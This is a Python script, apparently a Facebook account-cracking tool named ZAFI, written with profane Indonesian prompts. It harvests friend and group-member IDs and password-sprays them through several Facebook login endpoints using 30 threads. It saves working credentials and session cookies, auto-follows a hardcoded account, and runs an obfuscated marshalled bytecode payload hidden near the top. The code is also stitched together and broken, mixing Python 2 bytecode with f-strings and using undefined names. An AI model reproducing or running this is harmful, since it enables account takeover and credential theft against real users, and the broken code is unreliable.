#!/usr/bin/python2
# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak
# Open source code team | ngotak dikit cok jangan jual di perjual belikan 

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 	
 - author      : Romi Afrizal
 - facebook    : facebook.com/romi.afrizal.102
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282371648186
 - github      : github.com/Mark-Zuck
 - script name : ZAFI (Zona Akun Facebook Indonesia)
 - version     : 1.1
 
%s"""%(Hj,Mt))

import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
    
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime

_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()

user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
        
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
        
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass

# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
def banner():
	print (''' %s 
 © Group%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s> %sZona \n   /     /\\__  \\\   __\|  | %s> %sAkun \n  /     /_ / __ \|  |  |  | %s>%s Facebook [Meta] \n /_______ (____  /__|  |__| %s>%s Indonesia \n         \/    \/ \n %s[%s*%s] By : %sRomi Afrizal \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
 (H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
 
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('>> Mau Berapa Target Njing ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'>> Total Idz Yang Terkumpul🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print(f'\n{x}>> Total Idz Yang Terkumpul :{h} %s '%(len(id)))
	input(f'{x}>> [ {m}Klik Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'{x}>> Masukkan Username Atau Idz Grup : ')
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
	except requests.exceptions.ConnectionError:
		print('>> Sinyal Loo Kek Kontol ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(" Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		grup()
	elif berr2=='Kesalahan':
		alvino_xy('>> Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
	print(f'{x}>> Nama Grup : {b}%s'%(berr2))
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(" Anggota : -")
	else:
		print(f'{x}>> Anggota : {h}%s'%(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}>> Sedang Mengumpulkan Idz ')
	print(f'>> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						xy = random.choice([m,k,h,u,b,x])
						print(f'\r	———>> {x}({xy} %s {x}) <<———'%(len(id)), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
        
# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = id
        print('\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N))
        ___yayanganteng___ = input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print('\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N))
            while True:
                pwek = input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print(' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N))
                if pwek == '':
                    print('\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input('\n [*] method : ')
                        if cin == '':
                            print('\n %s[%s×%s] jangan kosong bro'%(N,M,N));__yan__()
                        elif cin == '1':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '2':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '3':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        else:
                            print('\n %s[%s×%s] input yang bener'%(N,M,N));__yan__()
                    print('\n [ pilih method login - silahkan coba satu² ]\n')
                    print(' [%s1%s]. method API (fast)'%(O,N))
                    print(' [%s2%s]. method mbasic (slow)'%(O,N))
                    print(' [%s3%s]. method mobile (super slow) [\033[92mDisarankan\033[0m]'%(O,N))
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print('\n [ pilih method login - silahkan coba satu² ]\n')
            print(' [%s1%s]. method API (fast)'%(O,N))
            print(' [%s2%s]. method mbasic (slow)'%(O,N))
            print(' [%s3%s]. method mobile (super slow) [\033[92mDisarankan\033[0m]'%(O,N))
            self.__pler__()
        else:
            print('\n %s[%s×%s] y/t goblok!'%(N,M,N));self.plerr(id)

    def __api__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                print('\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,N))
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        for pw in __yan__:
            pw = pw.lower()
            try:
                REQ=requests.Session()
                r = REQ.get("https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header_mbasic())
                das={
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                REQ.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header_post_mbasic(), allow_redirects = False)
                cok=REQ.cookies.get_dict()
                if "c_user" in cok:
                    print(f'\r  {H}* --> {user}|{pw}|{convert_cookie(cok)}{N}')
                    wrt = ' [✓] %s|%s|%s' % (user,pw,convert_cookie(cok))
                    ok.append(wrt)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(REQ,convert_cookie(cok))
                    break
                elif "checkpoint" in cok:
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = REQ.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                        wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    pass
                for i in list('\|-/'):
                    sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
                    sys.stdout.flush()
            except:
                pass
        loop += 1

    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            REQ=requests.Session()
            r = REQ.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header_get())
            das={
                "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                "uid":user,
                "flow":"login_no_pin",
                "pass":pw,
                "next":"https://developers.facebook.com/tools/debug/accesstoken/"
            }
            REQ.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header_post(), allow_redirects = False)
            cok=REQ.cookies.get_dict()
            if "c_user" in cok:
                print(f'\r  {H}* --> {user}|{pw}|{convert_cookie(cok)}{N}');self.follow(REQ,convert_cookie(cok))
                wrt = ' [✓] %s|%s|%s' % (user,pw,convert_cookie(cok))
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                self.follow(REQ,convert_cookie(cok))
                break
            if "checkpoint" in cok:
                try:
                    tokenz = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,tokenz)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
#GANTI USER AGENT
def useragent():
	print ("\n%s[%s01%s]. Ganti user agent "%(P,H,P))
	print ("%s[%s02%s]. Cek user agent "%(P,H,P))
	print ("%s[%s00%s]. Kembali "%(P,H,P))
	__Aang__Sayang__Laura__ = input('\n%s[%s+%s] Pilih :%s '%(P,M,P,H))
	uas(__Aang__Sayang__Laura__)
	
def uas(__Aang__Sayang__Laura__):
	if __Aang__Sayang__Laura__ == '':
		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
		uas(__Aang__Sayang__Laura__)
	elif __Aang__Sayang__Laura__ in("1","01"):
		print ("%s[%s!%s] Ketik %scancel%s untuk gunakan ua dari script"%(P,H,P,H,P))
		ua = input("%s[%s!%s] User agent :%s "%(P,H,P,H))
		if ua in(""):
			print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
			menu()
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);jeda(2)
			print ("\n%s[%s✓%s]  Berhasil menggunakan user agent script "%(P,H,P));jeda(2)
			pilihan().menu()
		open("ua.txt","w").write(ua);time.sleep(2)
		print ("\n%s[%s✓%s] Berhasil mengganti user agent"%(P,H,P));time.sleep(2)
		menu()
	elif __Aang__Sayang__Laura__ in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();time.sleep(2)
			print ("%s[%s+%s] User anget lu :%s%s "%(P,H,P,H,ua_));time.sleep(2)
			input('\n%s[%s!%s] Tekan enter '%(P,H,P))
			menu()
		except IOError:
			ua_ = '%s-'%(M)
	elif __Aang__Sayang__Laura__ in("0","00"):
		menu()
	else:
		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));time.sleep(2)
		uas(__Aang__Sayang__Laura__)

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}>> 1. Akun Old ')
	print('>> 2. Akun New ')
	print('')
	hu = input('>> Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
#	elif hu in ['3','03']:
#		for bacot in id:
#			xx = random.randint(0,len(id2))
#			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print('>> 1. Mobile ')
#	print('>> 2. Mbasic ')
#	print('>> 3. Touch  ')
#	print('>> 4. Mtouch ')
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('>> Pilih Yang Bener Kontol ')
		setting()
#	elif hc in ['2','02']:
#		method.append('free')
#	elif hc in ['3','03']:
#		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	_jembot_ = input('>> Tambahkan Aplikasi ( Y/t ) ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('>> Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	
	#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	alvino_xy(f'\n\t{x}——> {h}Gunakan Script Ini Sewajarnya\n\t{x}——> {h}Jika Ada Bug/Error Bilang Yahh\n\t{x}——> {h}Alvino Sehat Selalu Yah\n\t{x}——> {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}——> {h}Semoga Harimu Menyenangkan Sayang{x}')
	time.sleep(3)
	login()
